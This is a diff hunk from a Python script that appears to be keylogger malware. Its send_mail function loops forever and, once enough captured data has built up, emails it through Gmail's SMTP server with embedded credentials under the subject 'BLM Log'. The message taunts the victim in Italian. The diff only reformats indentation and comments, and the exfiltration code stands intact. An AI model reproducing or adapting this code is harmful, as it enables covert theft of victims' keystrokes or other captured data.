@@ -35,21 +35,21 @@ if not path.isfile(dir):
 def send_mail():
     global data
     while True:
-		# FILE
+# FILE
         if len(data) > 25:
-			# MAI
-		    timeInSecs = datetime.datetime.now()
-            # VISTO
-			SERVER = "smtp.gmail.com"
-            # PRIMA
-			PORT = 587
-			# DI
+# MAI
+            timeInSecs = datetime.datetime.now()
+# VISTO
+            SERVER = "smtp.gmail.com"
+# PRIMA
+            PORT = 587
+# DI
             USER = EEMAIL
-			# QUEST
+# QUEST
             PASS = EPASS
-			# OGGI
+# OGGI
             FROM = USER
-			# GIURO
+# GIURO
             TO = [USER]
             SUBJECT = "BLM Log di: " + timeInSecs.isoformat() 
             MESSAGE =  data + "\r\n\n\nGrazie per aver utilizzato il nostro servizio e vaffanculo a te e tua madre."
